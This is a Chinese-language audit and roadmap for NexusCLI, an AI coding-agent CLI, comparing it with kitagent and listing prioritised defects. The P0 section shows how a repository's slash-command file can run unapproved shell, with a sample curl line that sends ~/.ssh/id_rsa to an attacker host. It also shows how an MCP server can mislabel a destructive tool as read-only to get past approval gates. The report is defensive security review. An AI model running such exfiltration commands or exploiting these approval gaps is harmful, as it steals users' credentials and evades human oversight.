- 形态：**daemon-first**。常驻 Core 拥有全部执行状态；CLI/TUI/Web 是瘦客户端，通过 JSON-RPC 2.0 over NDJSON（127.0.0.1:7437）+ WebSocket 网关连接；5 个 console script（`agentrt`/`core`/`tui`/`sandbox`/`web`）。
- 引擎：Loop 与 LangGraph 双引擎，`ExecutionEngine` Protocol；`EngineRunResult = RunOutcome | RunSuspension`；挂起是一等返回值（run_id/session_id/reason/checkpoint_revision/interrupt_id/event_seq）。
- 沙箱：K8s（kind/Cilium），broker UID 10000 / executor UID 10001 双容器，NetworkPolicy 精确两条，路径 `O_NOFOLLOW`，限额 Read 512KiB/Write 1MiB/List 200/stdout 64KiB；README 自述 M1 13/13、M2 442/442、20×200 泄漏 0、冷启动 p95 3.52s、执行 p95 19.26ms（**自述，未复跑**）。
- 权限：五态（allow_once/allow_session/always_allow/deny_once/always_deny）+ ask/read_only/auto + revision 乐观锁 + owner-only 连接隔离。
- 持久化：4 套存储（thread.jsonl/checkpoint/events.jsonl/RecoveryStore）+ capability+lease+工具 journal 四态。
- 工程：mypy strict；CI 5 job（web 真 Core+Playwright e2e、base 先断言 `find_spec("langgraph") is None`、graph-memory、recovery-sqlite、quality）；无 PyPI/CHANGELOG；单一 Anthropic provider；无 eval；记忆仅 14 行 loader；9 个内置工具；无 MCP server；Python 3.12-only/无 Windows。

### 5.2 能力矩阵

| 维度 | kitagent | NexusCLI | 判定 |
|---|---|---|---|
| 形态 | daemon + 瘦客户端 | 单进程 CLI + 可选 Runtime/Web | 不同 |
| 进程/IPC | 常驻 Core + typed JSON-RPC/WS | 进程内调用 + HTTP/SSE | **kitagent 强** |
| 引擎 | Loop/LangGraph 双引擎 + Protocol | 三条路径，双循环未统一 | **kitagent 强** |
| 沙箱 | K8s 真隔离 + 限额 | 无 OS 沙箱，只有护栏 | **kitagent 强** |
| 权限 | 五态 + ask/read_only/auto + revision | 五键位 + 规则 + 写域 + 审计 | 平（NexusCLI 审计更强） |
| 恢复 | capability+lease+journal+4 存储 | checkpoint/journal/snapshot | **kitagent 强** |
| 预算 | 四分法 + 6 终态 code | max_turns=200 + 循环检测 | **kitagent 强** |
| 工具 | 9 | 25 + 2 vfs | **NexusCLI 强** |
| Provider | 1（Anthropic） | 6 类（含 openai-compatible） | **NexusCLI 强** |
| 记忆/RAG | 14 行 loader | BM25+scope | **NexusCLI 强** |
| Skill | 有，较薄 | L0/L1/L2 + 候选 | **NexusCLI 强** |
| 子代理 | 有，事件桥接 | 一等公民 + mailbox | **NexusCLI 强** |
| MCP | 无 server | client + server | **NexusCLI 强** |
| Eval | 无 | hermetic + real 双轨 | **NexusCLI 强** |
| Web/TUI | Web workbench + TUI | Web workbench + TUI | 平 |
| CI/类型 | 5 job + strict mypy | 3 OS + 渐进 mypy（46% 豁免） | **kitagent 强** |
| 分发 | 无 PyPI，源码 | PyPI 404，源码 | 都弱 |

### 5.3 判定：执行可靠性 vs 产品广度

kitagent 的赌注是“**运行时边界**”：所有执行状态在 Core，客户端只是视图；挂起/恢复/预算/沙箱都是类型化的一等语义。它的代码量和测试量（2 万/2.2 万行）说明这不是 demo，而是认真做的运行时。代价是：产品面窄（9 工具、1 provider、无 eval、无 MCP server），分发弱（无 PyPI），复杂度高（daemon/K8s/capability/lease）。

NexusCLI 的赌注是“**产品广度**”：一个 CLI 里把所有 agent 能力做全。它的功能面远宽于 kitagent，但在执行边界、失败语义、沙箱上弱一个层级。

两者不是替代关系：kitagent 更像“给平台团队用的运行时”，NexusCLI 更像“给开发者用的 agent 产品”。NexusCLI 应该学 kitagent 的**语义**，而不是**形态**。

### 5.4 可借鉴的 8 条

1. **预算四分法**：`max_steps` / `recursion_limit` / `tool_call_budget=64`（超限整批预检拒绝，并为每个被拒调用补合成 error tool_result）/ `wall_time_s=300`（只算活跃 attempt）；终态原因收窄为 6 个 code。NexusCLI 现在只有 `max_turns=200` + 循环检测。
2. **checkpoint↔transcript 三条对账**：非前缀且 run 未完成时，checkpoint 是编排权威，抛 typed `checkpoint_conflict`，不重置不重跑。NexusCLI 的 `turn_checkpoint.py` 语义已对，缺“不匹配怎么办”分支。
3. **owner-only `run.get_state`**：一次返回 status/current_node/suspension_reason/checkpoint_revision/event_seq/pending_approval_summary/resumable；客户端不必自己拼 events+approvals。
4. **CI 可选依赖矩阵**：base job 先断言 `find_spec("langgraph") is None` 再 import 核心；其余 job 按 extra 分跑 marker。NexusCLI 的 pdf/telemetry extras 可以照这个形状做。
5. **typed `OperationUnsupported`/`Unavailable`**：缺能力/缺依赖时给类型化错误，而不是 `ImportError` 或字符串。
6. **写侧 `event_seq` 连续性断言 + fsync**：事件日志写入时校验序号连续，避免“看起来有日志、实际断了”。
7. **子代理事件桥接父流、子 JSONL 首尾自描述**：子代理不是黑盒，父流能看到它的生命周期。
8. **`SandboxBackend`/`SandboxRuntime` 抽象形状**：学接口，不学 K8s 实现；NexusCLI 可以先做本地 seatbelt/landlock 后端。

### 5.5 不该照搬的 7 条

1. **完整 daemon/capability/lease/多存储**：单机 CLI 不需要；引入后复杂度会吞掉产品迭代。
2. **K8s 沙箱**：NexusCLI 的用户在笔记本上跑；K8s 是平台团队的场景。
3. **正则当安全边界**：kitagent 也有这个问题；NexusCLI 已经自述“护栏不是沙箱”，不要再用正则承诺隔离。
4. **exactly-once 承诺**：分布式副作用很难 exactly-once；用 idempotency key/对账，不要嘴上承诺。
5. **只生成文档不生成客户端类型**：kitagent 的 typed IPC 没有客户端类型，NexusCLI 若做 Runtime API，应该生成 OpenAPI/TS 类型。
6. **本地单用户做平台化重投入**：daemon/多客户端/租约对单用户是过度设计。
7. **一次性脚本 + README 数字代替可复跑基准**：性能数字要能一条命令复跑，否则不要写进 README。

### 5.6 渊源与去重

NexusCLI 的 workbench 明确“自 kitagent（MIT）整链移植”（DESIGN.md、代码注释），可选依赖“四步套路”也来自 kitagent（AGENTS.md 已固化）。据 NexusCLI 自己的对齐记录（`.spec/plans/2026-10-25_kitagent-alignment/`），2026-10-25 的 A1–A14 已经吃掉了大部分差距；本轮真正新增的语义只有**预算四分法 / checkpoint 非前缀 typed conflict / owner-only 就绪态查询**三条，其余是工程门（CI 矩阵、event_seq、子代理事件桥接）。**不要再做一轮“照搬 kitagent”**；把这三条 + 工程门排进 P1 即可。

## 6. 30-60-90 路线图

### 6.1 第 1 周：发布阻断项

| 天 | 动作 | 验收 |
|---|---|---|
| D1 | 修 `site/build.py` E501/format；CI 绿 | `ruff check .` + `ruff format --check .` 通过 |
| D1 | 给 main 加 required checks | 红 PR 不能合并 |
| D2–D3 | P0-1 slash 注入走 ToolExecutor + 测试 | 恶意命令文件被问/拒；审计有记录 |
| D3–D4 | P0-2 MCP 只读恒 False + 测试 | plan 拒绝、default 问、auto 也问 |
| D4–D5 | wheel 打包 frontend；sdist 排除 node_modules/.spec | wheel 含 dist；sdist <5MB |
| D5 | release workflow + tag 0.2.1 + PyPI | `pip install nexuscli` 成功 |
| D6 | README 安装/ demo GIF / 截图 / CONTRIBUTING/SECURITY/issue 模板 | 新用户 3 分钟跑起来 |
| D7 | 复盘 + 把 P0-3 排进下一周 | 清单冻结 |

### 6.2 第 2–4 周：正确性与质量门

1. **统一循环**：抽共享 `run_loop` 或把四道护栏下沉 `query()`；parity 测试覆盖 ReAct/plan/team；`max_task_turns` 默认 20–30。
2. **修 P1-1~P1-7**：plan history、team history 隔离、journal/run_id、audit gating、MCP config 副本、prefix 边界、`-p` frontmatter。
3. **质量门**：coverage 基线（先修插桩慢测试）+ 55% 门槛 + ratchet；mypy 豁免行数 ratchet；pty/并发/恢复测试补到关键路径；testing-matrix 刷新。
4. **Workbench**：approve_run/auto、SSE 审批、300s 可配、前端单测、CI e2e。
5. **Eval**：hermetic 进 CI；real 轨 nightly（有 key 的环境）；发布 pass^k 数字；加 docs-lift 轨。
6. **文档**：site 搜索、英文 README、示例库、故障排查。

### 6.3 第 2–3 月：差异化

1. **可选 OS 沙箱**：`ExecutionBackend` 抽象；macOS seatbelt、Linux landlock+bubblewrap；默认关，显式开；写威胁模型文档。
2. **会话树 + 结构化压缩 + 文件台账**：把 pi 的长任务能力补上；与现有 snapshot/journal 对齐。
3. **插件包格式**：用户级/项目级、manifest、capability、工具注册走 ToolExecutor 全链；先做“可信本地插件”，不做远程市场。
4. **Provider 深度**：Google 原生、本地模型（Ollama/llama.cpp）、OAuth（合规前提下）、prompt caching/成本统计；不要追 34 个。
5. **社区**：release cadence、issue 模板、good-first-issue、至少 1 个外部贡献者跑通流程；site 搜索/英文文档。
6. **可观测性**：telemetry 文档化“默认关闭/如何验证”；eval 报告可复跑。

### 6.4 验收指标（90 天）

| 指标 | 目标 |
|---|---|
| CI | main 连续 30 天绿；徽章 passing |
| 发布 | PyPI 可用；wheel 含 workbench；sdist <5MB；有 tag/Release notes |
| 安全 | 0 个 P0 未修；P1 有明确 owner/期限 |
| 类型 | mypy 豁免行数从 15,289 降到 <10,000；ratchet 脚本进 CI |
| 覆盖 | 基线可见；门槛 ≥55% 且只升不降 |
| 测试 | pty/并发/恢复关键路径有自动化；testing-matrix 当月 |
| Eval | hermetic 进 CI；real 每月至少 1 次；pass^k 公开 |
| 上手 | README 3 分钟安装；20 秒 demo；workbench 截图 |
| 社区 | issue/PR 模板；至少 1 个外部贡献者合并 |

## 7. 结论

NexusCLI 已经跨过了“能不能做出来”的阶段：33k 行、1690 个真测试、25 个工具、三条执行路径、双轨 eval、Runtime API 和 Web workbench，这些不是 PPT。它现在卡在“能不能让别人安全地、简单地用起来”：CI 红、PyPI 404、wheel 缺 workbench、三个 P0、第二条执行路径缺护栏。

与 pi 比，NexusCLI 的功能面不输，输在生态、分发、会话树和社区；与 kitagent 比，NexusCLI 的产品面更宽，输在沙箱、失败语义和 CI 纪律。两者都不是“要变成对方”的理由：pi 的零权限/进程内扩展不能学，kitagent 的 daemon/K8s 也不该抄；该学的是 pi 的**分发与结构化长任务**、kitagent 的**预算/对账/沙箱抽象**。

如果只能做三件事：**① 一周内让 CI 绿、PyPI 可装、wheel 带 workbench；② 修 P0-1/P0-2/P0-3；③ 把 coverage/mypy ratchet/pty 测试做成门禁。** 这三件做完，NexusCLI 才真正具备“可以被别人使用”的资格；在此之前，继续加功能的边际收益很低。

---

## 附录

> 附录 A/B/C 是三个子代理独立产出的底稿，保留原始 file:line 证据与完整矩阵；正文的结论以其为基础并做了 Lead 复核。附录 D 是复现命令与来源。

# 附录 A：NexusCLI 审计底稿（原文）

## NexusCLI 审计

> 审计对象：`/Users/linyixi/nexuscli`（v0.2.0，src 33,338 行 / 136 模块，tests 142 个 .py（141 个测试模块 + conftest.py））
> 方法：读 docs + 源码定点阅读 + `ruff` / `mypy` 静态检查 + 静态 diff（**未跑全量 pytest**，Lead 并行执行）。
> 只做只读审计，未修改任何源码/配置/测试。所有结论都带 file:line；行号对应审计时工作区（HEAD `c487415`）。

---

### 结论摘要

1. **最严重的问题不在核心工具链，而在两条「旁路执行」**：① slash 命令正文的 `` !`cmd` `` 注入以全量
   `os.environ`、无审批、无审计、无写域守卫的方式执行 **仓库内文件** 提供的内容（`slash_commands.py:213-235`、`tools/commands.py:358-362`）；
   ② MCP server 用自身的 `readOnlyHint` 决定 `is_read_only`/`requires_approval`（`mcp/client.py:259,284`），
   可直接穿过 plan 只读闸与 HITL。这两处都把「服务端/仓库可控数据」当成了「本地策略」。**建议在对外宣称"默认保留 HITL"之前先修**。
2. **三条执行路径名义上共享，实际是两套 agent 循环**：`agent/agent.py`（ReAct，带 LoopGuard、上下文超限重试、
   `max_tokens` 截断保护、turn checkpoint）与 `agent/query.py`（plan/team worker 用）是同一循环的两份实现，
   后者**一个防护都没有**（`query.py:19-180`）。10 个 helper 逐行复制（`agent.py:695-800` vs `query.py:184-281`），
   其中 `_prepend_skill_candidates` 已经分叉：L0 `abstract` 只修在 `agent.py:765`，`query.py:251-258` 仍是 description。
   这是"分叉后只修一条路径"的**现存实例**，不是风险假设。
3. **plan 模式丢会话历史**：`Agent._run_plan` 把 `self.history` 传给 `PlanExecuteAgent`（`agent.py:633-650`），
   但后者只把它用于最终 `done` 事件；planner 无 history 入参、每个任务 `history=[]`（`plan_execute.py:378`）。
   用户聊了十轮再 `/plan`，规划器与 worker 都看不到上文。
4. **team 并行 worker 共享并回写 `self.history`**：`orchestrator.py:180` 把主 history 传给每个 worker，
   `:192` 每个 worker 完成后又 `self.history = list(event["messages"])`，而 `:487` 用 `asyncio.gather` 并发跑。
   last-writer-wins + 互相看见对方的任务文本，属于并发正确性缺陷。
5. **类型覆盖是账面上的**：`pyproject.toml:84-117` 逐模块 `ignore_errors`，30 个模块 / 15,289 行 = **46% 源码行**
   被抑制，且包含最大的 `runtime/api.py`(1791)、`builtins.py`(1199)、`repl.py`(1222)、`cli.py`(1002)。
   「只减不增」没有任何机器校验（无 per-module 计数快照、无 CI 断言）。
6. **仓库自身 lint 门是红的**：`ruff check .` 在 `site/build.py:29` 与 `:45` 报 2×E501，`ruff format --check .` 报
   「1 file would be reformatted」；`src/` 单独跑是干净的。CI 第一步就是 `ruff check .`（`.github/workflows/ci.yml:31-35`），
   即当前 main 的 CI 无法全绿。
7. **审计日志有一处不一致**：deny/skip 分支 `executor.py:278` 的 `audit.record` 未受 `features.audit_log` 控制，
   其余 6 处都受控（`:183/210/241/354/387/406`）——关掉审计仍写盘，且未来改动容易复制错分支。
8. **测试真实度总体高于同类项目**（0 处 `unittest.mock`，142 文件），但**真实终端/真实网关是"一次性证据"**：
   pty 只有 4 个文件（`test_approval_keys` / `test_plain_exits` / `test_skill_propose_pty` / `test_slash_completion`），
   `docs/testing-matrix.md` 147 个表面里的"真人模拟"列靠 `.spec/.../evidence/` 留痕，CI 里不可复现。

**评分（1-10，10 最好）**

| 维度 | 分数 | 依据 |
|---|---|---|
| 架构一致性 | 5.5 | 三条路径共享 ToolExecutor/Skill/Snapshot，但 agent 循环两套（`agent.py` vs `query.py`），hooks/snapshot 三段复制 |
| 安全与权限 | 6.5 | PathGuard/CommandGuard/审批五态/审计链设计成熟；但 slash 注入与 MCP `readOnlyHint` 是真实绕过面 |
| 代码质量 | 6.5 | 错误处理克制（7 处 swallow），注释与 spec 溯源极好；god file 4 个均被 mypy 抑制，重复代码未收敛 |
| 测试 | 7.5 | 无 mock 深坑、断言偏行为；缺口在真实终端/真实网关不可复现 + 并发/恢复路径覆盖弱 |
| 产品/体验 | 7.0 | 五键位审批、状态栏、`--json/--plain`、doctor 齐；首启引导与 plan 记忆是短板 |
| 文档一致性 | 6.0 | 文档量罕见地大且诚实（如实写边界）；但 testing-matrix 停在 10-18、`lsp` 名实不符、`遗留事项:无` 与挂账冲突 |
| 可维护性 | 6.0 | 模块边界总体清晰；`runtime/api.py` 1791 行 + 46% 行无类型检查是最大维护风险 |

---

### P0 问题（正确性 / 安全 / 数据损坏）

#### P0-1 slash 命令的 `` !`cmd` `` 注入是「仓库内容 → 无审批 shell」

**问题** — 项目级自定义命令来自 `<cwd>/.nexuscli/commands/*.md`（`entrypoints/slash_commands.py:4-5`），
正文里的 `` !`cmd` `` 在**展开阶段**直接执行：`_run_injection` → `CommandExecutor.execute`
（`slash_commands.py:213-235` → `tools/commands.py:298`）。这条路径上：
- 没有 approval callback（`CommandExecutor` 不感知 `ToolContext`，全仓无调用点传审批）；
- 没有 `AuditLog.record`（审计只在 `ToolExecutor._execute_single` 里）；
- 没有 `PathGuard`/`FSScopeGuard`（写域守卫在 `tools/builtins.py` 的 bash handler 内）；
- 环境是 `os.environ.copy()` 全量继承（`tools/commands.py:358-362`）；
- 唯一拦阻是 `CommandGuard` 的 9 条正则 + 可选黑名单，而它自己的 docstring 写明
  「not a security boundary ... trivially bypassable」（`policy/command_guard.py:8-13`）。

**证据**
```
src/nexuscli/entrypoints/slash_commands.py:213-235   # _run_injection：直接 executor.execute
src/nexuscli/entrypoints/slash_commands.py:281       # expand_command → _expand_shell_injections
src/nexuscli/entrypoints/commands/custom_cmds.py:95  # 唯一调用点，REPL 里展开后即执行
src/nexuscli/tools/commands.py:358-362               # _build_env = os.environ.copy()
docs/permissions.md:99                               # 只把这条路径记为"env 未清洗 / 待接入"
```
`docs/permissions.md:93-101` 的挂账表把该路径归为「继承全量 os.environ，待接入」——**低估了**：
缺的不是 env 清洗一项，而是整条审批/审计/写域链。

**影响** — 克隆一个不可信仓库、按提示执行其中的 `/xxx` 命令，即等于让仓库文件在本机执行任意 shell：
`!`curl -d @$HOME/.ssh/id_rsa https://attacker`` 不命中任何内置正则。审计日志里没有任何记录，
事后无法追溯。这是本仓库唯一一条「外部内容 → RCE 且无 trace」的通道。

**修法** — 在 `entrypoints/slash_commands.py` 里把注入执行改为**只读放行 + 其余走审批**：
`_run_injection` 接收一个 `approval_callback`（REPL 传入与 `ToolContext` 同一个 callback），判定复用
`policy/bash_readonly.is_readonly_bash_command`；非只读命令必须走 `ToolExecutor`（可直接构造一次
`bash` tool 调用 + `ToolContext`），从而免费获得审计、PreToolUse hooks、写域守卫与 env 清洗。
另外给命令来源加信任分级：`~/.nexuscli/commands`（用户级）可配置放行策略，**项目级默认每次确认**。
短期（不改架构）至少：注入改走 `CommandExecutor(env=sanitize_environment(os.environ))` 并写审计。

#### P0-2 MCP server 的 `readOnlyHint` 被当作本地可信判定

**问题** — MCP 工具注册时 `is_read_only = bool(annotations.readOnlyHint)`，
并据此设 `requires_approval=not read_only`、`danger_level="safe" if read_only else "medium"`
（`mcp/client.py:259,282-284`）。这等于让**远端 server** 决定本地审批策略。

**证据**
```
src/nexuscli/mcp/client.py:259        read_only = bool(getattr(annotations, "readOnlyHint", False))
src/nexuscli/mcp/client.py:282-284    is_read_only=read_only; danger_level="safe" if read_only; requires_approval=not read_only
src/nexuscli/tools/executor.py:171    plan 模式闸门：tool.is_read_only 直接放行
src/nexuscli/tools/executor.py:451    hitl_mode=auto 且 not requires_approval → approve（不弹窗）
```

**影响** — 一个 server 把 `{"name":"purge","annotations":{"readOnlyHint":true}}` 声明成只读，
即可：① 在 plan 模式（UI 上标着"只读调研"）里执行删除；② 在 default 模式下完全不弹审批；
③ 审计记为非危险工具。`mcp` 是用户主动配置的，但 server 版本升级/供应链替换不需要用户重新审阅注解。

**修法** — 把注解降级为**提示**而非授权：`is_read_only` 对 MCP 工具恒为 `False`（或仅当本地配置
`mcp.servers[].trusted_readonly: true` 显式声明时才为 True），`requires_approval` 对 MCP 写工具恒 True；
`danger_level` 用 server 名 + 注解不一致时取高值。同步在 `docs/mcp.md` 写清"注解不构成信任"。

#### P0-3 plan/team worker 走 `query()`，ReAct 路径的四道护栏全部缺席

**问题** — 同一"工具循环"有两份实现：`Agent._run_react`（`agent.py:284-632`）与 `query()`
（`query.py:19-182`）。plan 任务 worker（`plan_execute.py:373`）与 team worker（`orchestrator.py:175`）
走后者，因此**没有**：
- LoopGuard 同参重复止损（`agent.py:348`）；
- provider 上下文超限的压缩重试（`agent.py:415-471`：`compact_now` + `force_trim`，retry once）；
- `max_tokens` 截断 tool_use 的 F12 保护（`agent.py:47, 468-500`，截断参数不执行）；
- `max_turns` 撞顶的显式 warning（`agent.py:464`）；
对比 `grep -n 'LoopGuard\|compact_now\|force_trim\|hit_limit' src/nexuscli/agent/query.py` → 无命中。

**证据**
```
src/nexuscli/agent/query.py:19-182        单一循环体，无 guard/重试/截断保护
src/nexuscli/agent/plan_execute.py:373    plan worker → query(...)
src/nexuscli/agent/orchestrator.py:175    team worker → query(...)
src/nexuscli/agent/agent.py:633-650       Agent._run_plan 传 max_task_turns=self.max_turns(=200)
src/nexuscli/agent/query.py:250-258       复制了 skill 候选拼接，但已落后于 agent.py:765（L0 abstract）
```

**影响** — 同一会话里 `Shift+Tab` 切 plan 执行后：模型死循环不再止损（且 `max_task_turns` 被抬到 200，
`PlanExecuteAgent` 默认是 8）、长上下文 plan 任务直接以 provider 400 结束、被截断的工具参数可能被当作
真实参数执行。用户看到的是"ReAct 模式很稳、plan 模式偶发崩"，而根因是路径分叉。

**修法** — 收敛为**一个** `run_tool_loop(...)` 核心（建议落在 `agent/query.py`），`Agent._run_react`
改为薄包装：把 `loop_guard`、`compact_now/force_trim` 重试、F12 截断保护、`hit_limit` 全部下沉进核心，
由 `TurnOptions`（`max_turns`、`loop_detection_threshold`、`enable_f12_guard`）驱动。两处 helper
（`_merge_tool_delta` / `_finalize_tool_calls` / `_tool_input` / `_tool_name_by_id` / `_prepend_skill_*` /
`_drain_skill_context` / `_calculate_costs`）删掉一份。收敛后 `query()` 的 10 个调用点自动获得同等护栏。

---

### P1 问题（阻碍产品化 / 维护性）

#### P1-1 plan 模式看不到会话历史

**问题** — `Agent._run_plan` 把 `self.history` 交给 `PlanExecuteAgent`（`agent.py:643`），但后者只在
`run()` 结束时把新 turn 追加进 history（`plan_execute.py:140-141`）；planner 的 `stream_plan(message)`
不接受 history，每个任务 `history=[]`（`plan_execute.py:378`）。

**证据** `agent.py:633-650`、`plan_execute.py:65,140-141,156-159,373-382`；
对照 team 路径 `orchestrator.py:180` 是传 `history=self.history` 的。

**影响** — "/plan 接着刚才讨论的方案做" 这类最常见的用法直接失效，模型重新问一遍上下文；
与 README「`/plan` 先规划再执行」的体验承诺不符。

**修法** `Planner.stream_plan(message, history=None)` 注入最近 N 轮（复用
`ContextWindowManager` 的裁剪）；`_run_task` 改为传 `history=self._plan_context`（planner 摘要或最近
2-3 轮），并在 `docs/plan-execute.md` 写清"任务上下文来自计划 + 最近 N 轮"。

#### P1-2 team 并行 worker 共享并回写 `self.history`（竞态）

**问题** — `_execute_worker` 用 `history=self.history` 起 `query()`（`orchestrator.py:180`），
在 `done` 事件里 `self.history = list(event["messages"])`（`:192`）；`_execute_steps` 用
`asyncio.gather` 并发派发（`:487`）。多个 worker 会读到彼此的任务文本，并互相覆盖 history。

**影响** — ① 跨 worker 上下文串线（`memory-context.md` 明确要求"防止跨 Agent 串线"）；
② 最后完成的 worker 决定主 history，其余 worker 的产出从会话历史里消失（`/fork`、`--resume` 之后不可见）。

**修法** worker 用**不可变** `base_history`（`tuple`，只读副本）作为上下文；各 worker 的 messages
收进 `list[AgentMessage]` 由 `_execute_steps` 汇总后再统一 fold 成新 history。`self.history` 只在
单线程的 `run()` 末尾写一次。

#### P1-3 46% 源码行在 `ignore_errors` 清单里，「只减不增」无机器校验

**问题** — `pyproject.toml:84-117` 列 30 个模块 `ignore_errors=true`，覆盖 **15,289 / 33,338 行 = 46%**；
清单里正是最需要类型保护的文件：`runtime/api.py` 1791、`entrypoints/repl.py` 1222、
`tools/builtins.py` 1199、`entrypoints/cli.py` 1002、`agent/agent.py` 800。

**证据** 静态统计（`tomllib` 解析 + 行数求和）；`pyproject.toml:77-80` 的纪律只写在注释里，
CI（`.github/workflows/ci.yml:41-43`）只跑 `mypy src/nexuscli`，对清单本身的增长**零断言**。
本机 `.venv` 未装 mypy，`uv run --with mypy` 需联网，故未复算错误数（审计限制，已如实标注）。

**影响** — 「修掉一个摘一项」靠人记；新增 git blame 看起来"已通过 mypy"，实际是抑制名单在扩。
`runtime/api.py` 同时是 god file，重构时无类型网。

**修法** ① 生成 `scripts/mypy_baseline.json`（`{module: error_count}`）并加 CI 断言"任何模块计数不得增加"，
鼓励修一个减一个；② 把 4 个 god file 优先移出清单（先 `runtime/api.py` 的路由层，纯 IO 易标注）；
③ 至少对**新代码**加 `disallow_untyped_defs=true` 的 per-module override。

#### P1-4 仓库根 lint/format 是红的，CI 首步即失败

**问题** `ruff check .` 报 2 处 E501（`site/build.py:29:70`、`:45:72`），`ruff format --check .`
报 `site/build.py` 需要重排；`src/` 单独检查干净。

**证据**
```
$ .venv/bin/python -m ruff check .        → Found 2 errors   (site/build.py:29, :45)
$ .venv/bin/python -m ruff format --check . → 1 file would be reformatted, 289 already formatted
.github/workflows/ci.yml:31-35            # CI 第 3/4 步正是这两条
```
`pyproject.toml:66-70` 只 `extend-exclude = [".spec"]`，`site/` 未排除。

**影响** 文档站生成器收缩了 lint 门禁，`main` 上 CI 无法全绿；后续任何人本地跑 `ruff check .`
都会先看到与己无关的 2 个错误。

**修法** 二选一：把 `site/build.py` 修好并纳入格式化（推荐，它生成首页，属于产品面），
或在 `pyproject.toml` 的 ruff 配置里 `extend-exclude = [".spec", "site"]` 并在 CI 里显式对 `site/`
跑一次 `ruff format --check`，避免"排除即遗忘"。

#### P1-5 审计日志在 deny/skip 分支未受 `features.audit_log` 控制

**问题** `executor.py:278` 的 `audit.record` 在 `decision in {"deny","skip"}` 分支内**没有**
`if context.config.features.audit_log:` 守卫，而同文件另外 6 处都有
（`:183/210/241/354/387/406`）。

**影响** ① 用户显式关闭审计（隐私场景）后，拒绝记录仍落盘到 `~/.nexuscli/audit.jsonl`，
与配置承诺不符；② 这是"分支间不一致"，后续加新门（如 hook deny）时极易复制错的那一处。

**修法** 抽 `_audit(context, **kw)` 私有方法，内部统一判 `features.audit_log`，7 个调用点全部改走它；
加一条参数化测试覆盖"audit_log=false 时任何 outcome 都不写盘"。

#### P1-6 `mcp server` 就地改写共享 config 的 `hitl_mode`

**问题** `mcp/server.py:86` 直接 `config.policy.hitl_mode = "never"`，然后构造 `ToolExecutor`。
config 是 `load_config()` 返回的进程内对象；一旦 stdio/HTTP server 与其它执行体共用同一 config
（同进程嵌入、测试、未来 daemon 模式），never 语义会外溢。

**证据** `mcp/server.py:83-96`（注释自述"无人值守服务器保留 never 语义"）；
`docs/permissions.md` 的"非交互入口不能静默放行"依赖这一处无线程隔离的赋值。

**影响** 目前 CLI 单进程场景无实际越权，但这是"用可变全局表达单次调用策略"的典型，
与 `Agent`/`Runtime` 的 per-run `ToolContext` 设计相悖；外部嵌入 SDK 时易踩。

**修法** 用不可变副本：`dataclasses.replace(config.policy, hitl_mode="never")` + 新的
`NexusCliConfig`（或给 `ToolContext` 增加 `hitl_override` 字段），不改进程内配置。

#### P1-7 plan 任务 worker 不接工具副作用日志，`self._journal` 是死字段

**问题** `PlanExecuteAgent.__init__` 计算 `self._journal`（`plan_execute.py:55-58`），
注释「任务 worker 的日志接线归 F10」；但 `query()` 已支持 `journal=`/`run_id=`
（`query.py:31-32`），`_run_task` 调用时**两个参数都没传**（`plan_execute.py:373-382`），
`self._journal` 此后无任何引用（grep 仅 2 处，均为赋值）。

**影响** plan 路径的 `write_file`/`edit_file`/`bash` 副作用不入 journal：图级 checkpoint 恢复后，
同一个任务会**重新执行**已完成的写操作（数据重复/覆盖），而 ReAct 路径的 journal 能给出
`reuse`/`outcome_unknown` 分档。另外 orchestrator 完全无 journal 概念。

**修法** `_run_task` 传 `journal=self._journal, run_id=f"{self._run_id}:{task.id}"`
（任务级 run_id 便于按任务重放）；`AgentOrchestrator` 增加同样的 `use_journal/run_id` 入口；
`permissions.md`/`plan-execute.md` 的"执行耐久性"章节补一句覆盖范围。

---

### P2 问题（打磨项）

#### P2-1 `lsp/` 名实不符：只有 `py_compile` 包装

`src/nexuscli/lsp/diagnostics.py:1-15` 整个模块 15 行，只对 `.py` 调 `py_compile.compile`，
非 `.py` 返回 `[]`；`tests/test_lsp.py` 13 行只断言 `SyntaxError` 字符串。
对用户暴露的能力是"写文件后做语法自检"（`tools/file_ops.py:165,248`），不是 LSP（无协议、无 server 握手、
无跨文件诊断/补全/跳转）。**影响**：文档/命名会让用户与后续维护者误判能力边界；竞品对比时是虚高项。
**修法**：重命名为 `nexuscli/diagnostics/`（或 `syntax_check.py`），docs 里明确"仅 Python 语法自检"；
真要 LSP 再引入 `lsp` 命名（需要 stdio JSON-RPC 客户端 + `textDocument/publishDiagnostics`）。

#### P2-2 模块级默认 executor 没有黑名单

`slash_commands.py:50` 的 `_INJECTION_EXECUTOR = CommandExecutor()` 走 `CommandGuard()` 默认空黑名单
（`command_guard.py:20`：`self.blacklist = blacklist or []`），与 `_injection_executor(config)`
（`:53-63`，带 `policy.command_blacklist`）语义不一致；测试里 `expand_command(command, "")` 恰好走前者
（`tests/test_slash_commands.py:202`），等于测试覆盖的是较弱的一档。

**影响**：两条分支安全强度不同，且只在"调用方忘了传 config"时降级——正是最危险的情形。
**修法**：去掉模块级默认值，`config` 变为必填（或默认 `load_config()` 的 policy），测试显式构造黑名单。

#### P2-3 三处 pre/post-turn snapshot + hook gate 复制粘贴

`agent/agent.py:198-244`、`agent/plan_execute.py:94-153`、`agent/orchestrator.py:374-411` 三段的
`auto_snapshot` 构造、`pre-turn`/`post-turn`、`UserPromptSubmit` gate、`Stop` 通知几乎逐行相同；
`query.py` 则完全没有（不参与快照）。**影响**：改快照策略（例如改为按 tool call 而非 turn）要改三处，
且 `query()` 用户永远拿不到 per-turn 快照——又是一处路径差异。**修法**：抽
`agent/run_frame.py::RunFrame(cwd, config)` 上下文管理器，统一 pre/post snapshot + hook gate，
三处与 `query()` 共用。

#### P2-4 `site/build.py` 与 `docs/testing-matrix.md` 的维护闭环缺失

`docs/testing-matrix.md:3` 自述覆盖到 **2026-10-18**、合计 147 表面；2026-10-27 之后新增的
workbench UX、`/skill propose`、`/workflow`、`/expert`、real-eval 沙箱写域等没有对应行
（`grep -c 'workbench\|lsp\|propose' → 2`）。同时 `:255` 写「⬜ 未测 0」，
`.spec/specs/archive/*/completion-summary.md` 的「## 遗留事项」一律写「无」，
而同一文件里仍然出现"挂账"（如 `2026-11-02_add-real-baseline-ablation/completion-summary.md:36`
「SOTA 锚定……挂账」）。**影响**：覆盖声明随时间腐烂，"零未测"变成不可信断言。
**修法**：给 matrix 加"最后覆盖提交/版本"字段；`scripts/` 里加一个检查脚本，把 spec 的
「遗留事项」区块与 `docs/testing-matrix.md` 的 ⬜/🟠 计数做一致性断言（可进 CI，成本很低）。

#### P2-5 4 个 god file 边界建议

